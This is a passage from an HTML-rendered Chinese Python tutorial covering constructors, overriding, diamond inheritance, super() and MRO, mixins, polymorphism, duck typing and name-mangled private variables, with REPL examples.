class="line">&gt;&gt;&gt; # 注意：如果对象同名属性未设置，会共享使用类的属性。</span><br><span class="line">&gt;&gt;&gt; c3 = C()</span><br><span class="line">&gt;&gt;&gt; c3.x</span><br><span class="line">100</span><br><span class="line">&gt;&gt;&gt; c3.__dict__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt;&gt;&gt; c3.set_x(666)</span><br><span class="line">&gt;&gt;&gt; c3.x</span><br><span class="line">666</span><br><span class="line">&gt;&gt;&gt; c3.__dict__</span><br><span class="line">&#123;&#x27;x&#x27;: 666&#125;</span><br></pre></td></tr></table></figure>
<h4 id="16-40-10-一个-“旁门左道”-的小技巧"><a href="#16-40-10-一个-“旁门左道”-的小技巧" class="headerlink" title="16.40.10 一个 “旁门左道” 的小技巧"></a>16.40.10 一个 “旁门左道” 的小技巧</h4><p>最小的类，就是只有一个 pass 语句填充的类：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     pass</span><br></pre></td></tr></table></figure><br>那么这个什么都没有的类，它可以做什么呢？</p>
<p>我们就可以把它当字典来使用：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; c = C()</span><br><span class="line">&gt;&gt;&gt; c.x = 250</span><br><span class="line">&gt;&gt;&gt; c.y = &quot;小甲鱼&quot;</span><br><span class="line">&gt;&gt;&gt; c.z = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; print(c.x)</span><br><span class="line">250</span><br><span class="line">&gt;&gt;&gt; print(c.y)</span><br><span class="line">小甲鱼</span><br><span class="line">&gt;&gt;&gt; print(c.z)</span><br><span class="line">[1, 2, 3]</span><br></pre></td></tr></table></figure></p>
<p>也没啥问题，对吧，因为本来类和对象的属性就是通过字典进行存放的嘛~<br>对比一下，使用字典的话我们得多敲几个字符：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = &#123;&#125;</span><br><span class="line">&gt;&gt;&gt; d[&#x27;x&#x27;] = 250</span><br><span class="line">&gt;&gt;&gt; d[&#x27;y&#x27;] = &quot;小甲鱼&quot;</span><br><span class="line">&gt;&gt;&gt; d[&#x27;z&#x27;] = [1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; print(d[&#x27;x&#x27;])</span><br><span class="line">250</span><br><span class="line">&gt;&gt;&gt; print(d[&#x27;y&#x27;])</span><br><span class="line">小甲鱼</span><br><span class="line">&gt;&gt;&gt; print(d[&#x27;z&#x27;])</span><br><span class="line">[1, 2, 3]</span><br></pre></td></tr></table></figure><br>虽然说是有点不按套路出牌，但有时候确实是很好用的。</p>
<h4 id="16-40-11-构造函数（init-self-…-）"><a href="#16-40-11-构造函数（init-self-…-）" class="headerlink" title="16.40.11 构造函数（init(self[, …])）"></a>16.40.11 构造函数（<strong>init</strong>(self[, …])）</h4><p>在类中定义 <code>__init__()</code> 方法，可以实现在实例化对象的时候进行个性化定制：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def __init__(self, x, y):</span><br><span class="line">...         self.x = x</span><br><span class="line">...         self.y = y</span><br><span class="line">...     def add(self):</span><br><span class="line">...         return self.x + self.y</span><br><span class="line">...     def mul(self):</span><br><span class="line">...         return self.x * self.y</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; c = C(2, 3)</span><br><span class="line">&gt;&gt;&gt; c.add()</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; c.mul()</span><br><span class="line">6</span><br></pre></td></tr></table></figure></p>
<h4 id="16-40-12-重写"><a href="#16-40-12-重写" class="headerlink" title="16.40.12 重写"></a>16.40.12 重写</h4><p>前面我们在 “继承” 中讲过，如果对于父类的某个属性或方法不满意的话，完全可以重新写一个同名的属性或方法对其进行覆盖。那么这种行为，我们就称之为是子类对父类的重写。<br>这里，我们可以定义一个新的类 —— D，继承自上面的类 C，然后对 add() 和 mul() 方法进行重写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class D(C):</span><br><span class="line">...     def __init__(self, x, y, z):</span><br><span class="line">...         C.__init__(self, x, y)</span><br><span class="line">...         self.z = z</span><br><span class="line">...     def add(self):</span><br><span class="line">...         return C.add(self) + self.z</span><br><span class="line">...     def mul(self):</span><br><span class="line">...         return C.mul(self) * self.z</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; d = D(2, 3, 4)</span><br><span class="line">&gt;&gt;&gt; d.add()</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; d.mul()</span><br><span class="line">24</span><br></pre></td></tr></table></figure></p>
<h4 id="16-40-13-钻石继承"><a href="#16-40-13-钻石继承" class="headerlink" title="16.40.13 钻石继承"></a>16.40.13 钻石继承</h4><p>下面代码中，类 B1 和 类 B2 都是继承自同一个父类 A，而类 C 又同时继承自它们，这种继承模式就被称之为钻石继承，或者菱形继承：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A:</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...         print(&quot;哈喽，我是A~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class B1(A):</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...        A.__init__(self)</span><br><span class="line">...        print(&quot;哈喽，我是B1~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class B2(A):</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...         A.__init__(self)</span><br><span class="line">...         print(&quot;哈喽，我是B2~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class C(B1, B2):</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...         B1.__init__(self)</span><br><span class="line">...         B2.__init__(self)</span><br><span class="line">...         print(&quot;哈喽，我是C~&quot;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><br>钻石继承这种模式，一旦处理不好就容易带来问题：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = C()</span><br><span class="line">哈喽，我是A~</span><br><span class="line">哈喽，我是B1~</span><br><span class="line">哈喽，我是A~</span><br><span class="line">哈喽，我是B2~</span><br><span class="line">哈喽，我是C~</span><br></pre></td></tr></table></figure><br>看，“哈喽，我是A~” 这一句竟然打印了 2 次！<br>也就是说，类 A 的构造函数被调用了 2 次！</p>
<p>怎么解？<br>看下面~</p>
<h4 id="16-40-14-super-函数和-MRO-顺序"><a href="#16-40-14-super-函数和-MRO-顺序" class="headerlink" title="16.40.14 super() 函数和 MRO 顺序"></a>16.40.14 super() 函数和 MRO 顺序</h4><p>上面这种通过类名直接访问的做法，是有一个名字的，叫 “调用未绑定的父类方法”。通常使用其实没有多大问题，但是遇到钻石继承嘛，就容易出事儿了~那么其实 Python 还有一个更好的实现方案，就是使用 super() 函数。super() 函数能够在父类中搜索指定的方法，并自动绑定好 self 参数。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class B1(A):</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...        super().__init__()</span><br><span class="line">...        print(&quot;哈喽，我是B1~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class B2(A):</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...         super().__init__()</span><br><span class="line">...         print(&quot;哈喽，我是B2~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class C(B1, B2):</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...         super().__init__()</span><br><span class="line">...         print(&quot;哈喽，我是C~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; c = C()</span><br><span class="line">哈喽，我是A~</span><br><span class="line">哈喽，我是B2~</span><br><span class="line">哈喽，我是B1~</span><br><span class="line">哈喽，我是C~</span><br></pre></td></tr></table></figure><br>之所以 super() 函数能够有效避免钻石继承带来的问题，是因为它是按照 MRO 顺序去搜索方法，并且自动避免重复调用的问题。</p>
<p>那什么是 MRO 顺序呢？<br>MRO（Method Resolution Order），翻译过来就是 “方法解析顺序”。</p>
<p>想要查找一个类的 MRO 顺序有两种方法~<br>一种是通过调用类的 <code>mro()</code> 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; C.mro()</span><br><span class="line">[&lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.B1&#x27;&gt;, &lt;class &#x27;__main__.B2&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;]</span><br><span class="line">&gt;&gt;&gt; B1.mro()</span><br><span class="line">[&lt;class &#x27;__main__.B1&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;]</span><br></pre></td></tr></table></figure><br>另一种则是通过 <code>__mro__</code> 属性：</p>
<p>注：这里大家会看到它们都有一个 <code>&lt;class &#39;object&#39;&gt;</code>，这是因为 object 是所有类的基类，所以就算你不写，它也是会被隐式地继承。</p>
<h4 id="16-40-15-super-也非全知全能！"><a href="#16-40-15-super-也非全知全能！" class="headerlink" title="16.40.15 super() 也非全知全能！"></a>16.40.15 super() 也非全知全能！</h4><p>由于 super() 函数是依赖于 MRO 顺序的，但 MRO 的排序方式，经常会让初学者感到迷惑，从而导致 super() 函数常常不能如大家预期那样去工作…… </p>
<p>这篇扩展阅读 -&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-213994-1-1.html">传送门</a><br>大家一定要花点时间研究一下，最好是收藏起来，以后在使用 super() 函数时出现问题，随时可以在这里面找到答案。</p>
<h4 id="16-40-16-Mixin"><a href="#16-40-16-Mixin" class="headerlink" title="16.40.16 Mixin"></a>16.40.16 Mixin</h4><p>Mixin 即 Mix-in，翻译过来就是所谓的 “混入” 或者 “乱入”（也有音译为 “迷因”），它是一种设计模式。所谓设计模式，就是利用编程语言已有的特性，针对面向对象开发过程中，反复出现的问题，而设计出来的解决方案。</p>
<p>为了更好地解释什么是 Mixin，我们先来看一段代码：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Animal:</span><br><span class="line">    def __init__(self, name, age):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    </span><br><span class="line">    def say(self):</span><br><span class="line">        print(f&quot;我叫&#123;self.name&#125;，今年&#123;self.age&#125;岁。&quot;)</span><br><span class="line">    </span><br><span class="line">class Pig(Animal):</span><br><span class="line">    def special(self):</span><br><span class="line">        print(&quot;我的技能是拱大白菜~&quot;)</span><br><span class="line">    </span><br><span class="line">p = Pig(&quot;大肠&quot;, 5)</span><br><span class="line">p.say()</span><br><span class="line">p.special()</span><br></pre></td></tr></table></figure><br>代码实现如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我叫大肠，今年5岁。</span><br><span class="line">我的技能是拱大白菜~</span><br></pre></td></tr></table></figure><br>好，现在由于剧情需要，我们要让大肠起飞……问一下大家，咱们有没有办法在不修改原有类的代码结构的前提下，让大肠，也就是猪，飞起来？<br>其实仔细思考一下并不难，我们可以写一个类，它的功能就是起飞，然后让 Pig 类去继承它：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">class FlyMixin:</span><br><span class="line">    def fly(self):</span><br><span class="line">        print(&quot;哦豁，我还会飞~&quot;)</span><br><span class="line">    </span><br><span class="line">class Pig(FlyMixin, Animal):</span><br><span class="line">    def special(self):</span><br><span class="line">        print(&quot;我的技能是拱大白菜~&quot;)</span><br><span class="line">    </span><br><span class="line">p = Pig(&quot;大肠&quot;, 5)</span><br><span class="line">p.say()</span><br><span class="line">p.special()</span><br><span class="line">p.fly()</span><br></pre></td></tr></table></figure><br>代码实现如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我叫大肠，今年5岁。</span><br><span class="line">我的技能是拱大白菜~</span><br><span class="line">哦豁，我还会飞~</span><br></pre></td></tr></table></figure></p>
<h4 id="16-40-17-多态"><a href="#16-40-17-多态" class="headerlink" title="16.40.17 多态"></a>16.40.17 多态</h4><p>多态在编程中是一个非常重要的概念，它是指同一个运算符、函数或对象在不同的场景下，具有不同的作用效果，这么一个技能。</p>
<p>我们知道加号（+）和乘号（*）运算符在 Python 被广泛使用，但是它们并非只是单一的用途，比如当两边都是数字的时候，它们执行的是算术运算：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 3 + 5</span><br><span class="line">8</span><br><span class="line">&gt;&gt;&gt; 3 * 5</span><br><span class="line">15</span><br></pre></td></tr></table></figure><br>如果遇到字符串，又会是另外一番面孔：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;Py&quot; + &quot;FishC&quot;</span><br><span class="line">&#x27;PyFishC&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;FishC&quot; * 3</span><br><span class="line">&#x27;FishCFishCFishC&#x27;</span><br></pre></td></tr></table></figure><br>执行的是拼接和重复~</p>
<p>这种 “见机行事” 的行为，我们就称之为多态。<br>除了运算符之外，Python 中有一些函数也是支持多态的，比如 len() 函数，它的功能是获取一个对象的长度：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; len(&quot;FishC&quot;)</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; len([&quot;Python&quot;, &quot;FishC&quot;, &quot;Me&quot;])</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; len(&#123;&quot;name&quot;:&quot;小甲鱼&quot;, &quot;age&quot;:&quot;18&quot;&#125;)</span><br><span class="line">2</span><br></pre></td></tr></table></figure><br>你看，给它传递一个字符串，它帮你统计字符的个数；给它传递一个列表，它帮你统计列表中元素的个数；给它传递一个字典，它计算的是字典中键的个数。这就是函数的多态性。</p>
<p>多态的好处这样就一目了然了，尽管我们的接口是不变的，但它却可以根据不同的对象执行不同的操作。</p>
<h4 id="16-40-18-类继承的多态"><a href="#16-40-18-类继承的多态" class="headerlink" title="16.40.18 类继承的多态"></a>16.40.18 类继承的多态</h4><p>Python 允许我们在子类中定义与父类同名的方法。就是如果我们对于父类的某个方法不满意的话，完全是可以在子类中重新定义一个同名的方法进行覆盖，这种做法我们称为重写，这在前面的课程有讲解过了。</p>
<p>重写，其实就是实现类继承的多态：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Shape:</span><br><span class="line">...     def __init__(self, name):</span><br><span class="line">...         self.name = name</span><br><span class="line">...     def area(self):</span><br><span class="line">...         pass</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; class Square(Shape):</span><br><span class="line">...     def __init__(self, length):</span><br><span class="line">...         super().__init__(&quot;正方形&quot;)</span><br><span class="line">...         self.length = length</span><br><span class="line">...     def area(self):</span><br><span class="line">...         return self.length * self.length</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; class Circle(Shape):</span><br><span class="line">...     def __init__(self, radius):</span><br><span class="line">...         super().__init__(&quot;圆形&quot;)</span><br><span class="line">...         self.radius = radius</span><br><span class="line">...     def area(self):</span><br><span class="line">...         return 3.14 * self.radius * self.radius</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; class Triangle(Shape):</span><br><span class="line">...     def __init__(self, base, height):</span><br><span class="line">...         super().__init__(&quot;三角形&quot;)</span><br><span class="line">...         self.base = base</span><br><span class="line">...         self.height = height</span><br><span class="line">...     def area(self):</span><br><span class="line">...         return self.base * self.height / 2</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; s = Square(5)</span><br><span class="line">&gt;&gt;&gt; c = Circle(6)</span><br><span class="line">&gt;&gt;&gt; t = Triangle(3, 4)</span><br><span class="line">&gt;&gt;&gt; s.name</span><br><span class="line">&#x27;正方形&#x27;</span><br><span class="line">&gt;&gt;&gt; c.name</span><br><span class="line">&#x27;圆形&#x27;</span><br><span class="line">&gt;&gt;&gt; t.name</span><br><span class="line">&#x27;三角形&#x27;</span><br><span class="line">&gt;&gt;&gt; s.area()</span><br><span class="line">25</span><br><span class="line">&gt;&gt;&gt; c.area()</span><br><span class="line">113.03999999999999</span><br><span class="line">&gt;&gt;&gt; t.area()</span><br><span class="line">6.0</span><br></pre></td></tr></table></figure><br>正方形、圆形、三角形都继承自 <code>Shape</code> 类，但又都重写了构造函数和 area() 方法，这就是多态的体现。</p>
<h4 id="16-40-19-自定义函数的多态"><a href="#16-40-19-自定义函数的多态" class="headerlink" title="16.40.19 自定义函数的多态"></a>16.40.19 自定义函数的多态</h4><p>这个简单，直接看代码你们就懂了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Cat:</span><br><span class="line">...     def __init__(self, name, age):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         self.age = age</span><br><span class="line">...     def intro(self):</span><br><span class="line">...         print(f&quot;我是一只沙雕猫咪，我叫&#123;self.name&#125;，今年&#123;self.age&#125;岁~&quot;)</span><br><span class="line">...     def say(self):</span><br><span class="line">...         print(&quot;mua~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class Dog:</span><br><span class="line">...     def __init__(self, name, age):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         self.age = age</span><br><span class="line">...     def intro(self):</span><br><span class="line">...         print(f&quot;我是一只小狗，我叫&#123;self.name&#125;，今年&#123;self.age&#125;岁~&quot;)</span><br><span class="line">...     def say(self):</span><br><span class="line">...         print(&quot;哟吼~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class Pig:</span><br><span class="line">...     def __init__(self, name, age):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         self.age = age</span><br><span class="line">...     def intro(self):</span><br><span class="line">...         print(f&quot;我是一只小猪，我叫&#123;self.name&#125;，今年&#123;self.age&#125;岁~&quot;)</span><br><span class="line">...     def say(self):</span><br><span class="line">...         print(&quot;oink~&quot;) # 不要问我猪为什么这么叫，我是跟隔壁幼儿园的小朋友学的，oink~</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; c = Cat(&quot;web&quot;, 4)</span><br><span class="line">&gt;&gt;&gt; d = Dog(&quot;布布&quot;, 7)</span><br><span class="line">&gt;&gt;&gt; p = Pig(&quot;大肠&quot;, 5)</span><br><span class="line">&gt;&gt;&gt; def animal(x):</span><br><span class="line">...     x.intro()</span><br><span class="line">...     x.say()</span><br><span class="line">...        </span><br><span class="line">&gt;&gt;&gt; animal(c)</span><br><span class="line">我是一只沙雕猫咪，我叫宝儿，今年3岁~</span><br><span class="line">mua~</span><br><span class="line">&gt;&gt;&gt; animal(d)</span><br><span class="line">我是一只小狗，我叫布布，今年5岁~</span><br><span class="line">哟吼~</span><br><span class="line">&gt;&gt;&gt; animal(p)</span><br><span class="line">我是一只小猪，我叫大肠，今年5岁~</span><br><span class="line">oink~</span><br></pre></td></tr></table></figure><br>看，这个 <code>animal()</code> 函数就具有多态性，该函数接收不同对象作为参数，并在不检查其类型的情况下执行其方法。</p>
<h4 id="16-40-20-鸭子类型"><a href="#16-40-20-鸭子类型" class="headerlink" title="16.40.20 鸭子类型"></a>16.40.20 鸭子类型</h4><p>鸭子类型（Duck Typing）这个概念来源于美国印第安纳州的诗人詹姆斯·惠特科姆·莱利（James Whitcomb Riley, 1849 ~ 1916）的诗句：</p>
<p><strong>“When I see a bird that walks like a duck and swims like a duck and quacks like a duck, I call that bird a duck.”</strong></p>
<p>什么是鸭子类型？<br>举个例子，比如我们定义一个自行车：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Bicycle:</span><br><span class="line">...     def intro(self):</span><br><span class="line">...         print(&quot;我曾经跨过山和大海，也穿过人山人海~&quot;)</span><br><span class="line">...     def say(self):</span><br><span class="line">...         print(&quot;都有自行车了，要什么兰博基尼？&quot;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><br>自行车这个类，既有 intro() 方法，也有 say() 方法，所以它即便被前面的 animal() 函数所调用，也不会出错：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b = Bicycle()</span><br><span class="line">&gt;&gt;&gt; animal(b)</span><br><span class="line">我曾经跨过山和大海，也穿过人山人海~</span><br><span class="line">都有自行车了，要什么兰博基尼？</span><br></pre></td></tr></table></figure><br>编程中鸭子类型的概念就是：我们不需要关心对象具体是什么类型，只在乎它的行为方法是否符合要求即可。</p>
<h4 id="16-40-21-私有变量"><a href="#16-40-21-私有变量" class="headerlink" title="16.40.21 私有变量"></a>16.40.21 私有变量</h4><p>在大多数面向对象的编程语言中，都存在着私有变量（private variable）的概念，所谓私有变量，就是指通过某种手段，使得对象中的属性或方法无法被外部所访问。</p>
<p>Python 对于私有变量的实现是引入了一种叫 name mangling 的机制（翻译过来叫 “名字改编”、“名称改写” 或者 “名称修饰”），语法是在变量名前面加上两个连续下划线（__）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def __init__(self, x):</span><br><span class="line">...         self.__x = x</span><br><span class="line">...     def set_x(self, x):</span><br><span class="line">...         self.__x = x</span><br><span class="line">...     def get_x(self):</span><br><span class="line">...         print(self.__x)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; c = C(250)</span><br></pre></td></tr></table></figure><br>此时，我们是无法直接通过变量名访问到该变量的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c.__x</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#13&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    c.__x</span><br><span class="line">AttributeError: &#x27;C&#x27; object has no attribute &#x27;__x&#x27;</span><br></pre></td></tr></table></figure><br>想要访问变量的值，就需要使用指定的接口，比如这段代码中的 set_x() 和 get_x() 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c.get_x()</span><br><span class="line">250</span><br><span class="line">&gt;&gt;&gt; c.set_x(520)</span><br><span class="line">&gt;&gt;&gt; c.get_x()</span><br><span class="line">520</span><br></pre></td></tr></table></figure></p>
